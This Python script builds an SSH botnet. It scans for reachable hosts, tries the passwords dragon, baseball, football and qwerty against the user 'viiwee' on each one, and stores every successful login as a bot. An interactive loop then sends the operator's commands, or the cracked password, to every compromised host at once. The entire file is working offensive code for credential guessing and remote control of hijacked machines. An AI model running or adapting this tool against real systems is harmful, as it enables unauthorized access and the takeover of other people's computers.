from pexpect import pxssh
import findLogins
import PortScan

# Passwords are: dragon, baseball, football, qwerty
passwords = open('passwords.txt')  # ['dragon', 'baseball', 'football', 'qwerty']
viable_bots = []
user = 'viiwee'

class Client:
	def __init__(self, host, user, password):
		self.host = host
		self.user = user
		self.password = password
		self.session = self.connect()
	def connect(self):
		try:
			s = pxssh.pxssh()
			s.login(self.host, self.user, self.password)
			return s
		except:
			print('[-] Error Connecting')
	def send_command(self, cmd):
		self.session.sendline(cmd)
		self.session.prompt()
		return self.session.before


def generateLogins():
	foundAddresses = PortScan.findAddresses()
	print('Testing passwords on the IPs')
	def connect(host, user, password):
		try:
			connection = pxssh.pxssh()
			connection.login(host, user, password)
			connection.close()
			return connection
		except:
			return False


	for viable_ip in foundAddresses:
		print('Finding password for ' + user + '@' + viable_ip)
		# print(viable_ip)
		# Try all of the passwords to attempt to connect
		passwords.seek(0)
		for password in passwords:
			password = password.strip()
			connection = connect(viable_ip, user, password.strip())
			if not connection:  # If connection is refused or otherwise fails, returns false
				# print('Tried: ' + password + ' and failed')
				continue
			print('Adding a new bot: ' + str([viable_ip, user, password]))
			viable_bots.append([viable_ip, user, password])
			break  # Password is correct, continue on
		# We have an IP that we can connect to, and we have a login
		# Return a list of bots and the login info
	print('Found viable bots: ' + str(viable_bots))
	return viable_bots

	
def generateBots():
	generatedLogins = generateLogins()
	print('Creating bot array(net?)')
	bots = []
	for bot in generatedLogins:  # Create an array of bots
		bot = Client(bot[0], bot[1], bot[2])  # Create the bot instant
		bots.append(bot)	# Append the instance to the bots array
	return bots

		
def sendCommands():
	bots = generateBots()
	command='blank, temporarily'
	while command.strip() != '':
		command = input('What command would you like to send? [-pass to enter passwords]')
		for bot in bots:
			if command == '-pass':
				print('Sending password: ' + bot.password + ' to ' + bot.host)
				print(bot.send_command(bot.password).decode())
			else:
				print('Sending "' + command + '" to:  '+ bot.host)
				print(bot.send_command(command).decode())


sendCommands()
